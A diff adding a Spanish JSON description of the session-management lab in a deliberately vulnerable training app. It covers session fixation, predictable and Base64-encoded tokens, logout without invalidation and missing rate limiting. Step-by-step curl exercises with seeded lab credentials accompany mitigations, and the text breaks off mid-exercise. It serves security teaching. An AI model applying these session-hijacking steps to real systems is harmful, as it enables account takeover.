@@ -1,0 +1,503 @@
+{
+  "id": "sessionManagement",
+  "title": "Session Management: fijación, tokens predecibles, logout e intentos de login",
+  "concept": "La familia implementa un laboratorio de gestión de sesiones en seis niveles bajo el controlador anotado como SessionManagementVulnerability. Las anotaciones @VulnerableAppRestController(value = SessionManagementVulnerability) y @VulnerableAppRequestMapping(value = LEVEL_n) se combinan con el contexto autorizado /VulnerableApp, por lo que las rutas externas son /VulnerableApp/SessionManagementVulnerability/LEVEL_n. Los niveles 1 a 5 exponen un defecto distinto; el nivel 6 es la variante segura de control. El servicio mantiene las sesiones en memoria, autentica contra session_users y devuelve respuestas GenericVulnerabilityResponseBean con los campos isValid y content.",
+  "source_files": [
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/sessionManagement/SessionManagementVulnerability.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/sessionManagement/SessionManagementService.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/sessionManagement/SessionLoginRequest.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/sessionManagement/SessionUser.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/sessionManagement/SessionUserRepository.java",
+    "/home/ubuntu/workshop-research/upstream/src/test/java/org/sasanlabs/service/vulnerability/sessionManagement/SessionManagementServiceTest.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/attackvectors/SessionManagementVulnerabilityPayload.properties",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/scripts/SessionManagement/db/schema.sql",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/scripts/SessionManagement/db/data.sql",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/i18n/messages.properties",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/Common/SessionManagement.html",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/Common/SessionManagement.js",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/Common/SessionManagement.css",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/LEVEL_1/SessionManagement.html",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/LEVEL_1/SessionManagement.js",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/LEVEL_1/SessionManagement.css",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/LEVEL_6/SecureSessionManagement.html",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/LEVEL_6/SecureSessionManagement.js",
+    "/home/ubuntu/workshop-research/upstream/src/main/resources/static/templates/SessionManagementVulnerability/LEVEL_6/SecureSessionManagement.css",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/internal/utility/annotations/VulnerableAppRestController.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/internal/utility/annotations/VulnerableAppRequestMapping.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/controller/VulnerableAppRestController.java",
+    "/home/ubuntu/workshop-research/upstream/src/main/java/org/sasanlabs/service/vulnerability/bean/GenericVulnerabilityResponseBean.java"
+  ],
+  "levels": [
+    {
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_1",
+      "method": "POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_1/profile",
+      "parameters": {
+        "login": {
+          "query": "action=login",
+          "json_body": {
+            "username": "<usuario sembrado>",
+            "password": "<contraseña sembrada>"
+          },
+          "cookie": "VAPP_SESSION_LEVEL1"
+        },
+        "logout": {
+          "query": "action=logout",
+          "cookie": "VAPP_SESSION_LEVEL1"
+        },
+        "profile": {
+          "cookie": "VAPP_SESSION_LEVEL1"
+        }
+      },
+      "behavior": "Con credenciales válidas, level1Login acepta un VAPP_SESSION_LEVEL1 suministrado por el cliente. Si el cookie entrante no está vacío, lo conserva como sesión posterior al login, guarda la asociación nivel:token y devuelve preLoginSessionId, postLoginSessionId y sessionFixationConfirmed=true. Sin cookie, crea SESSION-<contador>, comenzando en SESSION-1001 en una instancia nueva. El perfil usa el token del cookie. El logout limpia el cookie, pero la ruta de este nivel no destruye la asociación en memoria.",
+      "vulnerable": true,
+      "notes": "@AttackVector declara SESSION_FIXATION y @VulnerableAppRequestMapping declara POST y la plantilla LEVEL_1. El cookie se construye sin HttpOnly. La prueba de servicio level1Login_ShouldKeepClientSuppliedSessionId confirma que el mismo token puede consultar el perfil después de autenticar. El prefijo /VulnerableApp/ y el nombre SessionManagementVulnerability provienen de las anotaciones y del controlador central; no son rutas inferidas de la plantilla."
+    },
+    {
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_2",
+      "method": "POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_2/profile",
+      "parameters": {
+        "login": {
+          "query": "action=login",
+          "json_body": {
+            "username": "<usuario sembrado>",
+            "password": "<contraseña sembrada>"
+          }
+        },
+        "logout": {
+          "query": "action=logout",
+          "cookie": "VAPP_SESSION_LEVEL2"
+        },
+        "profile": {
+          "cookie": "VAPP_SESSION_LEVEL2"
+        }
+      },
+      "behavior": "level2Login ignora un token entrante y genera SESSION-<contador> con un AtomicInteger que empieza en 1000 y se incrementa de uno en uno; las dos primeras sesiones de una instancia limpia son SESSION-1001 y SESSION-1002. Cada token se guarda en la sesión correspondiente y se devuelve también en JSON y Set-Cookie. El perfil acepta cualquier token activo del nivel. El cookie de sesión se marca HttpOnly. El logout solo borra el cookie y no invalida la sesión de servidor.",
+      "vulnerable": true,
+      "notes": "@AttackVector declara PREDICTABLE_SESSION_ID. La prueba level2Login_ShouldGeneratePredictableSequentialSessionIds comprueba la secuencia 1001/1002. Para una demostración de acceso a otra identidad, deben generarse dos sesiones controladas con cuentas distintas del SQL semilla y probar el token vecino; no basta con ver un número con formato SESSION-n."
+    },
+    {
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_3",
+      "method": "POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_3/profile",
+      "parameters": {
+        "login": {
+          "query": "action=login",
+          "json_body": {
+            "username": "<usuario sembrado>",
+            "password": "<contraseña sembrada>"
+          }
+        },
+        "logout": {
+          "query": "action=logout",
+          "cookie": "VAPP_SESSION_LEVEL3"
+        },
+        "profile": {
+          "cookie": "VAPP_SESSION_LEVEL3"
+        }
+      },
+      "behavior": "level3Login genera SESSION-<contador> con un contador que empieza en 18920 y suma 100, y después aplica Base64 estándar. En una instancia limpia los dos primeros valores son Base64 de SESSION-19020 y SESSION-19120: U0VTU0lPTi0xOTAyMA== y U0VTU0lPTi0xOTEyMA==. El valor codificado se guarda como clave de sesión, se devuelve en JSON y se coloca en un cookie HttpOnly. El perfil consulta directamente el valor codificado recibido. El logout no invalida la sesión de servidor.",
+      "vulnerable": true,
+      "notes": "@AttackVector declara OBSCURED_PREDICTABLE_SESSION_ID. La prueba level3Login_ShouldGenerateObscuredPredictableSequentialSessionIds verifica el contador y la codificación. Base64 solo oculta el patrón; no proporciona aleatoriedad ni autenticidad. Si la instancia ya atendió logins, hay que observar/decodificar el valor actual y calcular el vecino en vez de asumir 19020."
+    },
+    {
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_4",
+      "method": "POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_4/profile",
+      "parameters": {
+        "login": {
+          "query": "action=login",
+          "json_body": {
+            "username": "<usuario sembrado>",
+            "password": "<contraseña sembrada>"
+          }
+        },
+        "logout": {
+          "query": "action=logout",
+          "cookie": "VAPP_SESSION_LEVEL4"
+        },
+        "profile": {
+          "cookie": "VAPP_SESSION_LEVEL4"
+        }
+      },
+      "behavior": "level4Login crea un UUID aleatorio, lo asocia al usuario y lo entrega en un cookie HttpOnly. level4MissingLogoutInvalidation llama a logoutWithoutInvalidation: el response borra el cookie del navegador, pero no ejecuta sessions.remove. Por ello, si se conserva el UUID antes de cerrar sesión, el endpoint /profile sigue encontrando el usuario.",
+      "vulnerable": true,
+      "notes": "@AttackVector declara MISSING_LOGOUT_INVALIDATION. La prueba level4Logout_ShouldNotInvalidateServerSideSession comprueba que el perfil sigue siendo válido después de logout. En el controlador includeProof=false, por lo que el logout HTTP no devuelve serverSessionInvalidated; la verificación debe reutilizar el token antiguo contra /profile."
+    },
+    {
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_5",
+      "method": "POST para login/logout; GET en /VulnerableApp/SessionManagementVulnerability/LEVEL_5/profile",
+      "parameters": {
+        "login": {
+          "query": "action=login",
+          "json_body": {
+            "username": "<usuario sembrado>",
+            "password": "<intento>"
+          }
+        },
+        "logout": {
+          "query": "action=logout",
+          "cookie": "VAPP_SESSION_LEVEL5"
+        },
+        "profile": {
+          "cookie": "VAPP_SESSION_LEVEL5"
+        }
+      },
+      "behavior": "level5Login usa UUID aleatorio para los logins válidos, pero ante credenciales incorrectas siempre devuelve una respuesta 200 con isValid=false, attemptAllowed=true, rateLimitingApplied=false y el mensaje de credenciales inválidas. No mantiene contador, retraso, bloqueo ni CAPTCHA. El logout de este nivel sí elimina la sesión de servidor mediante logoutWithInvalidation.",
+      "vulnerable": true,
+      "notes": "@AttackVector declara NO_LOGIN_RATE_LIMITING. La prueba level5Login_ShouldAllowRepeatedFailedAttempts repite cuatro intentos incorrectos y espera que todos sigan permitidos. El ejercicio seguro usa cuatro intentos iguales, no una lista de contraseñas ni una campaña de fuerza bruta."
+    },
+    {
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_6",
+      "method": "POST para login/logout; no hay mapping HTTP GET /VulnerableApp/SessionManagementVulnerability/LEVEL_6/profile en esta clase",
+      "parameters": {
+        "login": {
+          "query": "action=login",
+          "json_body": {
+            "username": "<usuario sembrado>",
+            "password": "<contraseña sembrada>"
+          },
+          "cookie": "VAPP_SESSION_LEVEL6 opcional"
+        },
+        "logout": {
+          "query": "action=logout",
+          "cookie": "VAPP_SESSION_LEVEL6"
+        }
+      },
+      "behavior": "level6Login es la variante segura: exige un nombre no vacío, limita a tres fallos dentro de una ventana de cinco minutos por nombre de usuario, genera un UUID nuevo y, si recibió un token entrante, elimina su asociación anterior antes de guardar la nueva. Devuelve los datos del perfil junto con el nuevo sessionId y un cookie HttpOnly. logoutWithInvalidation elimina la sesión de servidor y devuelve serverSessionInvalidated=true. La interfaz segura muestra el perfil desde la respuesta de login; no existe un @GetMapping /profile para LEVEL_6.",
+      "vulnerable": false,
+      "notes": "@VulnerableAppRequestMapping usa variant=SECURE, no hay @AttackVector y la plantilla es LEVEL_6/SecureSessionManagement. SessionManagementServiceTest confirma que el token entrante no autentica, que se devuelve un token distinto, que el cuarto fallo queda bloqueado y que logout invalida. La ausencia de una ruta HTTP /profile limita la comprobación de replay exclusivamente por HTTP."
+    }
+  ],
+  "exercises": [
+    {
+      "title": "Nivel 1: fijación con un token elegido por el cliente",
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_1",
+      "method": "POST y GET",
+      "params": {
+        "login": {
+          "action": "login",
+          "cookie": "VAPP_SESSION_LEVEL1=VA_FIXED_SESSION"
+        },
+        "profile": {
+          "cookie": "VAPP_SESSION_LEVEL1=VA_FIXED_SESSION"
+        },
+        "control_negativo": "Repetir el login sin enviar Cookie para comparar con una sesión generada por el servidor"
+      },
+      "headers": {
+        "Content-Type": "application/json",
+        "Cookie": "VAPP_SESSION_LEVEL1=VA_FIXED_SESSION"
+      },
+      "body": {
+        "username": "session_user",
+        "password": "password123"
+      },
+      "content_type": "application/json",
+      "expected": "La predicción basada en el código es que el login válido conserve VA_FIXED_SESSION, devuelva content.preLoginSessionId y content.postLoginSessionId con ese valor y content.sessionFixationConfirmed=true. Una consulta posterior a /profile con el mismo cookie debería devolver el perfil session_user si el servicio está inicializado y la sesión sigue en memoria. El control sin cookie debería producir un token SESSION-nuevo y no confirmar fijación.",
+      "check": {
+        "kind": "json",
+        "value": true,
+        "path": "content.sessionFixationConfirmed"
+      },
+      "explanation": "El cookie se planta antes de autenticar, pero no se intenta acceder a ningún recurso externo ni a datos del host. La evidencia fuerte no es solo que Set-Cookie repita el valor: es que el perfil se puede consultar con el mismo token después del login. La comparación sin cookie ayuda a separar el comportamiento vulnerable del flujo normal.",
+      "mitigation": "No aceptar un identificador de sesión elegido por el cliente y regenerar/rotar el token tras autenticar; invalidar cualquier sesión preautenticación, usar cookies HttpOnly/Secure/SameSite según despliegue y vincular la sesión al contexto apropiado.",
+      "steps": [
+        "En Kali, autenticar con el token inocuo preseleccionado: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_1?action=login' -H 'Content-Type: application/json' -H 'Cookie: VAPP_SESSION_LEVEL1=VA_FIXED_SESSION' --data '{\"username\":\"session_user\",\"password\":\"password123\"}'",
+        "Reutilizar exactamente el mismo valor contra el perfil: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_1/profile' -H 'Cookie: VAPP_SESSION_LEVEL1=VA_FIXED_SESSION'",
+        "Ejecutar el control sin cookie: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_1?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_user\",\"password\":\"password123\"}' y comparar Set-Cookie y content.sessionId con el valor fijo.",
+        "Registrar solo los campos de respuesta necesarios; no hacer click para otorgar puntaje y no tratar un HTTP 200 aislado como prueba de autenticación."
+      ],
+      "hints": [
+        "El nombre exacto del cookie es VAPP_SESSION_LEVEL1 y la acción va en la query, no en el JSON.",
+        "El perfil es GET y requiere enviar manualmente el cookie; el JavaScript de la plantilla no sustituye esta comprobación.",
+        "La aserción útil es que el token antes y después del login sea el mismo y que ese token encuentre el perfil; una cabecera Set-Cookie por sí sola no prueba acceso."
+      ]
+    },
+    {
+      "title": "Nivel 2: token secuencial y vecino controlado",
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_2",
+      "method": "POST y GET",
+      "params": {
+        "first_login": {
+          "action": "login",
+          "account": "session_user"
+        },
+        "predicted_profile": {
+          "cookie": "VAPP_SESSION_LEVEL2=SESSION-1002"
+        },
+        "second_login": {
+          "action": "login",
+          "account": "session_admin"
+        },
+        "profile": {
+          "cookie": "VAPP_SESSION_LEVEL2=SESSION-1002"
+        }
+      },
+      "headers": {
+        "Content-Type": "application/json",
+        "Cookie": "VAPP_SESSION_LEVEL2=<token_observado_o_predicho>"
+      },
+      "body": {
+        "first_login": {
+          "username": "session_user",
+          "password": "password123"
+        },
+        "second_login": {
+          "username": "session_admin",
+          "password": "AdminPassword@123"
+        }
+      },
+      "content_type": "application/json",
+      "expected": "En un proceso nuevo, el primer login predice SESSION-1001 y el segundo crea SESSION-1002. Si se prueba SESSION-1002 antes del segundo login, la respuesta prevista es No valid session found; después del segundo login, el mismo token debería resolver el perfil session_admin. Si el proceso ya atendió otros logins, se debe reemplazar 1001/1002 por el contador vecino observado; no se debe afirmar un número fijo.",
+      "check": {
+        "kind": "json",
+        "value": "session_admin",
+        "path": "content.username"
+      },
+      "explanation": "El ejercicio crea dos sesiones controladas con identidades distintas y demuestra que el token vecino se puede anticipar por el contador. La respuesta exitosa del segundo perfil es evidencia de asociación de sesión; no se presenta como una prueba de IDOR ni se toca una cuenta fuera de las semillas del laboratorio.",
+      "mitigation": "Generar identificadores con un CSPRNG suficiente, sin contadores observables ni transformaciones reversibles; rotar e invalidar sesiones según el ciclo de autenticación y aplicar autorización en cada recurso.",
+      "steps": [
+        "En una instancia limpia, crear la primera sesión: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_user\",\"password\":\"password123\"}' y anotar content.sessionId/Set-Cookie.",
+        "Antes de crear la segunda sesión, probar el vecino esperado como control negativo: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2/profile' -H 'Cookie: VAPP_SESSION_LEVEL2=SESSION-1002'",
+        "Crear la segunda sesión controlada: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_admin\",\"password\":\"AdminPassword@123\"}'",
+        "Consultar el perfil con el token vecino: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_2/profile' -H 'Cookie: VAPP_SESSION_LEVEL2=SESSION-1002'",
+        "Si el contador no empieza en 1000, observar dos tokens emitidos, usar su incremento real y repetir solo la comparación antes/después; no enumerar indefinidamente."
+      ],
+      "hints": [
+        "El contador del servicio es independiente de los niveles 1 y 3, pero persiste mientras viva la instancia.",
+        "El perfil no recibe el token como parámetro: lo toma de VAPP_SESSION_LEVEL2.",
+        "Un formato SESSION-1002 no es suficiente; hay que demostrar que el token vecino estaba inactivo antes y quedó asociado después al segundo login."
+      ]
+    },
+    {
+      "title": "Nivel 3: Base64 no oculta un contador predecible",
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_3",
+      "method": "POST y GET",
+      "params": {
+        "first_login": {
+          "action": "login",
+          "account": "session_user"
+        },
+        "predicted_profile": {
+          "cookie": "VAPP_SESSION_LEVEL3=U0VTU0lPTi0xOTEyMA=="
+        },
+        "second_login": {
+          "action": "login",
+          "account": "session_admin"
+        }
+      },
+      "headers": {
+        "Content-Type": "application/json",
+        "Cookie": "VAPP_SESSION_LEVEL3=<token_Base64_observado>"
+      },
+      "body": {
+        "first_login": {
+          "username": "session_user",
+          "password": "password123"
+        },
+        "second_login": {
+          "username": "session_admin",
+          "password": "AdminPassword@123"
+        }
+      },
+      "content_type": "application/json",
+      "expected": "En una instancia nueva, el primer token esperado es U0VTU0lPTi0xOTAyMA==, que decodifica a SESSION-19020; el siguiente candidato es U0VTU0lPTi0xOTEyMA==, que decodifica a SESSION-19120. El candidato debe fallar antes de la segunda creación y, tras el segundo login controlado, el perfil con ese cookie debería mostrar session_admin. En una instancia usada, los valores deben derivarse del token observado y del salto de 100.",
+      "check": {
+        "kind": "manual",
+        "value": "Decodificar content.sessionId, comprobar prefijo SESSION- y salto predecible de 100; después verificar que el token codificado vecino devuelve content.username=session_admin solo tras el segundo login"
+      },
+      "explanation": "Se usa únicamente Base64 de tokens del propio laboratorio y dos usuarios sembrados. La prueba muestra que una codificación reversible no aumenta la entropía. El control temporal del token vecino evita confundir un valor cualquiera con una sesión efectivamente creada.",
+      "mitigation": "Usar identificadores aleatorios criptográficamente seguros y no codificar contadores como sustituto de aleatoriedad; proteger el cookie con HttpOnly, Secure y una política SameSite apropiada.",
+      "steps": [
+        "Crear la primera sesión en una instancia limpia: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_user\",\"password\":\"password123\"}'",
+        "Usar como control negativo el vecino codificado antes del segundo login: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3/profile' -H 'Cookie: VAPP_SESSION_LEVEL3=U0VTU0lPTi0xOTEyMA=='",
+        "Crear la segunda sesión: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_admin\",\"password\":\"AdminPassword@123\"}'",
+        "Consultar el perfil con el valor Base64 vecino: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_3/profile' -H 'Cookie: VAPP_SESSION_LEVEL3=U0VTU0lPTi0xOTEyMA=='",
+        "Si la instancia no es nueva, no forzar 19020/19120: observar el token, decodificarlo fuera del objetivo y aplicar el salto documentado de 100."
+      ],
+      "hints": [
+        "Los valores de la instancia limpia están documentados en el test y en el payload, pero el estado en memoria puede hacerlos avanzar.",
+        "El cookie se llama VAPP_SESSION_LEVEL3 y lleva el valor codificado completo, incluidos los signos = finales.",
+        "La evidencia es asociación del token vecino con la segunda identidad; decodificar un token por sí solo solo demuestra ofuscación débil."
+      ]
+    },
+    {
+      "title": "Nivel 4: replay del token después de logout",
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_4",
+      "method": "POST y GET",
+      "params": {
+        "login": {
+          "action": "login",
+          "account": "session_user"
+        },
+        "logout": {
+          "action": "logout",
+          "cookie": "VAPP_SESSION_LEVEL4=<token_guardado>"
+        },
+        "replay": {
+          "cookie": "VAPP_SESSION_LEVEL4=<mismo_token_guardado>"
+        }
+      },
+      "headers": {
+        "Content-Type": "application/json",
+        "Cookie": "VAPP_SESSION_LEVEL4=<token_guardado>"
+      },
+      "body": {
+        "login": {
+          "username": "session_user",
+          "password": "password123"
+        },
+        "logout": null
+      },
+      "content_type": "application/json",
+      "expected": "El código predice un UUID nuevo en login. Logout debería devolver Set-Cookie con Max-Age=0, pero el replay del UUID capturado contra /profile debería seguir devolviendo el perfil session_user porque level4 usa logoutWithoutInvalidation. La cabecera que borra el cookie no demuestra por sí sola invalidación del estado de servidor.",
+      "check": {
+        "kind": "json",
+        "value": "session_user",
+        "path": "content.username"
+      },
+      "explanation": "El token se conserva solo para esta demostración dentro del laboratorio y se reutiliza una vez, sin acceder a secretos. Se contrasta el efecto de borrar el cookie con el efecto que debería tener destruir la sesión de servidor.",
+      "mitigation": "En logout, eliminar la asociación server-side antes o junto con la expiración del cookie, rotar tokens en cambios de privilegio y aplicar expiración/inactividad y revocación del lado del servidor.",
+      "steps": [
+        "Iniciar sesión y copiar el UUID de Set-Cookie o content.sessionId: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_4?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_user\",\"password\":\"password123\"}'",
+        "Cerrar sesión enviando el UUID copiado: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_4?action=logout' -H 'Cookie: VAPP_SESSION_LEVEL4=<token_guardado>'",
+        "Reprobar el token antiguo, no el cookie vacío: curl -i --get 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_4/profile' -H 'Cookie: VAPP_SESSION_LEVEL4=<token_guardado>'",
+        "Como control de transporte, repetir /profile sin Cookie y confirmar que no hay sesión; esto solo demuestra que el cookie es necesario, no que logout haya revocado el token antiguo."
+      ],
+      "hints": [
+        "El controlador no incluye serverSessionInvalidated en la respuesta de logout de LEVEL_4; la prueba relevante es el replay.",
+        "No sustituyas <token_guardado> por el valor vacío que envía Set-Cookie al cerrar sesión.",
+        "Un 200 no basta: exige isValid=true y un perfil coherente en la respuesta de replay."
+      ]
+    },
+    {
+      "title": "Nivel 5: cuatro intentos iguales sin rate limiting",
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_5",
+      "method": "POST",
+      "params": {
+        "action": "login",
+        "username": "session_rate_limit_victim",
+        "password": "VA_WRONG_TRAINING_GUESS"
+      },
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "username": "session_rate_limit_victim",
+        "password": "VA_WRONG_TRAINING_GUESS"
+      },
+      "content_type": "application/json",
+      "expected": "La predicción de level5Login es que cada uno de los cuatro POST devuelva HTTP 200 pero JSON con isValid=false, content.attemptAllowed=true y content.rateLimitingApplied=false. No se intenta descubrir la contraseña real ni se continúa después de cuatro solicitudes.",
+      "check": {
+        "kind": "json",
+        "value": false,
+        "path": "content.rateLimitingApplied"
+      },
+      "explanation": "Es una prueba de control de volumen mínimo, no un ataque de fuerza bruta: usa el mismo marcador de contraseña cuatro veces y se detiene. El resultado significativo es que el propio JSON declara que el intento sigue permitido y que no se aplicó limitación.",
+      "mitigation": "Aplicar rate limiting por cuenta y señales de origen, backoff progresivo, bloqueo temporal cuidadosamente diseñado, alertas y CAPTCHA adaptativo; almacenar contadores de forma consistente y no filtrar si una cuenta existe.",
+      "steps": [
+        "Primer intento controlado: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Segundo intento idéntico: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Tercer intento idéntico: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Cuarto y último intento: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_5?action=login' -H 'Content-Type: application/json' --data '{\"username\":\"session_rate_limit_victim\",\"password\":\"VA_WRONG_TRAINING_GUESS\"}'",
+        "Comparar los cuatro JSON y detenerse; no usar wordlists, paralelismo, retrasos artificiales ni contraseñas reales."
+      ],
+      "hints": [
+        "La cuenta session_rate_limit_victim y su contraseña legítima están en el SQL de semilla, pero la contraseña legítima no es necesaria para este ejercicio.",
+        "Usa content.attemptAllowed y content.rateLimitingApplied, no solo el código de estado.",
+        "El control positivo correspondiente es LEVEL_6, donde el cuarto fallo para el mismo username debe quedar bloqueado dentro de cinco minutos."
+      ]
+    },
+    {
+      "title": "Nivel 6 seguro: regeneración de token y logout con invalidación",
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_6",
+      "method": "POST",
+      "params": {
+        "login": {
+          "action": "login",
+          "cookie_prelogin": "VAPP_SESSION_LEVEL6=VA_PRELOGIN_MARKER"
+        },
+        "logout": {
+          "action": "logout",
+          "cookie": "VAPP_SESSION_LEVEL6=<nuevo_UUID>"
+        }
+      },
+      "headers": {
+        "Content-Type": "application/json",
+        "Cookie": "VAPP_SESSION_LEVEL6=VA_PRELOGIN_MARKER"
+      },
+      "body": {
+        "login": {
+          "username": "session_user",
+          "password": "password123"
+        },
+        "logout": null
+      },
+      "content_type": "application/json",
+      "expected": "La predicción del código es que login devuelva un UUID nuevo distinto de VA_PRELOGIN_MARKER, los datos del perfil y Set-Cookie con HttpOnly. Al enviar ese UUID a logout, la respuesta debería contener content.serverSessionInvalidated=true y borrar el cookie. No se debe intentar /LEVEL_6/profile: esa ruta no está mapeada HTTP.",
+      "check": {
+        "kind": "json",
+        "value": true,
+        "path": "content.serverSessionInvalidated"
+      },
+      "explanation": "Es el control positivo frente a LEVEL_1 y LEVEL_4: el token entrante no se conserva y el logout elimina la sesión server-side. La diferencia del token debe revisarse manualmente en login; la aserción automática propuesta se aplica a la respuesta final de logout.",
+      "mitigation": "Mantener la estrategia del nivel 6: regenerar tokens al autenticar y cambiar privilegios, invalidar la sesión anterior, usar cookies protegidos, revocar en logout y devolver el mínimo de datos necesario.",
+      "steps": [
+        "Enviar un marcador de prelogin y credenciales válidas: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=login' -H 'Content-Type: application/json' -H 'Cookie: VAPP_SESSION_LEVEL6=VA_PRELOGIN_MARKER' --data '{\"username\":\"session_user\",\"password\":\"password123\"}'",
+        "Comprobar manualmente que content.sessionId y Set-Cookie contienen un UUID distinto de VA_PRELOGIN_MARKER y que Set-Cookie incluye HttpOnly; copiar solo el nuevo UUID.",
+        "Cerrar sesión con el UUID nuevo: curl -i -X POST 'http://target:9090/VulnerableApp/SessionManagementVulnerability/LEVEL_6?action=logout' -H 'Cookie: VAPP_SESSION_LEVEL6=<nuevo_UUID>'",
+        "Verificar content.serverSessionInvalidated=true y Max-Age=0 en Set-Cookie; no convertir la ausencia de /profile en un resultado de replay HTTP."
+      ],
+      "hints": [
+        "El login seguro devuelve el perfil en content; no hace una segunda llamada HTTP a /profile.",
+        "La comparación importante es nuevo_UUID != VA_PRELOGIN_MARKER, no que el UUID tenga un formato particular.",
+        "HttpOnly se comprueba en la cabecera Set-Cookie; no se puede demostrar con document.cookie desde la plantilla."
+      ]
+    },
+    {
+      "title": "Nivel 6 seguro: control positivo de bloqueo tras tres fallos",
+      "route": "/VulnerableApp/SessionManagementVulnerability/LEVEL_6",
+      "method": "POST",
+      "params": {
+        "action": "login",
+        "username": "session_rate_limit_victim",
+        "password": "VA_WRONG_TRAINING_GUESS"
+      },
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "username": "session_rate_limit_victim",
+        "password": "VA_WRONG_TRAINING_GUESS"
+      },
+      "content_type": "application/json",
+      "expected": "En una ventana nueva de cinco minutos para ese username, los tres primeros fallos deberían devolver failedAttempts 1, 2 y 3 con rateLimitingApplied=true; el cuarto debería devolver loginBlocked=true, rateLimitingApplied=true y el mensaje de demasiados intentos. Esto contrasta directamente con los cuatro intentos permitidos en LEVEL_5.",
+      "check": {
+        "kind": "json",
+        "value": true,
+        "path": "content.loginBlocked"
+      },
+      "explanation": "Solo se generan cuatro solicitudes idénticas y se usan datos de laboratorio. El contador es por username, vive en memoria y tiene TTL de cinco minutos; por eso una ejecución anterior puede dejar el usuario ya bloqueado y debe anotarse, no interpretarse como cuatro respuestas nuevas.",
+      "mitigation": "Conservar un límite server-side con ventana y backoff, protegerlo frente a reinicios/distribución, registrar eventos sin revelar credenciales y combinarlo con controles de cuenta y origen.",
+      "steps": [
